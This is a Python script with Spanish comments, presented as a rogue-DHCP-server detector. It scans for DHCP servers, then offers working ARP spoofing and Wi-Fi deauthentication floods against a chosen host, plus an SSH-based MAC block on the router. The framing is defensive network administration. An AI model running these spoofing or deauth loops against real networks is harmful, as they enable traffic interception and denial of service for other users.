from scapy.all import *
import time
import paramiko
from termcolor import colored
import pyfiglet
import os
import netifaces

# Lista de colores para darle estilo al programa
def print_banner():
    banner = pyfiglet.figlet_format("DHCP Intruder Detector", font="slant")
    print(colored(banner, 'cyan'))

# Configuración de servidores DHCP autorizados
authorized_dhcp_servers = ["00:11:22:33:44:55"]  # Cambia con la MAC de tu router principal

# Función para obtener el rango de red local
def get_network_range():
    iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
    ip_info = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]
    ip_address = ip_info['addr']
    netmask = ip_info['netmask']
    network_range = f"{ip_address}/{netmask}"
    return network_range

# Detectar servidores DHCP en la red
def detect_dhcp_servers():
    # Mostrar rango de red
    network_range = get_network_range()
    print(colored(f"Escaneando la red en el rango {network_range} en busca de servidores DHCP...", "yellow"))
    dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff") / IP(src="0.0.0.0", dst="255.255.255.255") / UDP(sport=68, dport=67) / BOOTP(op=1) / DHCP(options=[("message-type", "discover"), "end"])

    # Capturar respuestas
    responses = srp(dhcp_discover, timeout=5, verbose=0)[0]
    detected_servers = []

    for idx, (_, response) in enumerate(responses):
        mac_address = response[Ether].src
        ip_address = response[IP].src
        detected_servers.append((idx + 1, ip_address, mac_address))
        print(colored(f"{idx + 1}. Servidor DHCP detectado - IP: {ip_address}, MAC: {mac_address}", "green" if mac_address in authorized_dhcp_servers else "red"))

    return detected_servers

# Ataque ARP Spoofing
def arp_spoof(target_ip, target_mac, spoof_ip):
    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    try:
        while True:
            send(arp_response, verbose=0)
            print(colored(f"[INFO] Enviando respuesta ARP falsa a {target_ip} - fingiendo ser {spoof_ip}", "cyan"))
            time.sleep(2)
    except KeyboardInterrupt:
        print(colored("[INFO] Ataque ARP Spoofing detenido.", "yellow"))

# Ataque de desautenticación Wi-Fi
def send_deauth(target_mac, gateway_mac):
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
    try:
        while True:
            sendp(packet, inter=0.1, count=100, verbose=0)
            print(colored(f"[INFO] Enviando paquetes de desautenticación a {target_mac}", "cyan"))
            time.sleep(1)
    except KeyboardInterrupt:
        print(colored("[INFO] Ataque de desautenticación detenido.", "yellow"))

# Bloqueo en el router mediante SSH
def block_mac(router_ip, username, password, mac_address):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(router_ip, username=username, password=password)
    block_command = f"ip firewall add src-mac={mac_address} action=drop"
    stdin, stdout, stderr = ssh.exec_command(block_command)
    print(colored(f"[INFO] MAC {mac_address} bloqueada en el router.", "cyan"))
    ssh.close()

# Función principal para ejecutar el programa
def main():
    os.system('clear' if os.name == 'posix' else 'cls')
    print_banner()
    detected_servers = detect_dhcp_servers()

    if not detected_servers:
        print(colored("No se han detectado servidores DHCP en la red.", "red"))
        return

    print(colored("\nSelecciona el servidor DHCP que deseas analizar:", "yellow"))
    for server in detected_servers:
        idx, ip, mac = server
        print(f"{idx}. IP: {ip}, MAC: {mac}")

    try:
        selection = int(input(colored("\nIntroduce el número del servidor: ", "cyan")))
        selected_server = next((server for server in detected_servers if server[0] == selection), None)
        
        if not selected_server:
            print(colored("Selección no válida. Saliendo...", "red"))
            return

        target_ip, target_mac = selected_server[1], selected_server[2]

        print(colored("\nOpciones de ataque:", "yellow"))
        print("1. ARP Spoofing")
        print("2. Deauth Attack (Wi-Fi)")
        print("3. Bloqueo en el router")

        attack_choice = int(input(colored("\nSelecciona el tipo de ataque: ", "cyan")))

        if attack_choice == 1:
            gateway_ip = input(colored("Introduce la IP del router/pasarela: ", "cyan"))
            print(colored(f"\nIniciando ARP Spoofing contra {target_ip}...", "yellow"))
            arp_spoof(target_ip, target_mac, gateway_ip)
        elif attack_choice == 2:
            gateway_mac = input(colored("Introduce la MAC del router Wi-Fi: ", "cyan"))
            print(colored(f"\nIniciando ataque de desautenticación contra {target_ip}...", "yellow"))
            send_deauth(target_mac, gateway_mac)
        elif attack_choice == 3:
            router_ip = input(colored("Introduce la IP del router: ", "cyan"))
            username = input(colored("Introduce el nombre de usuario SSH: ", "cyan"))
            password = input(colored("Introduce la contraseña SSH: ", "cyan"))
            print(colored(f"\nBloqueando {target_mac} en el router...", "yellow"))
            block_mac(router_ip, username, password, target_mac)
        else:
            print(colored("Opción de ataque no válida.", "red"))

    except ValueError:
        print(colored("Error: Entrada no válida. Saliendo...", "red"))

if __name__ == "__main__":
    main()
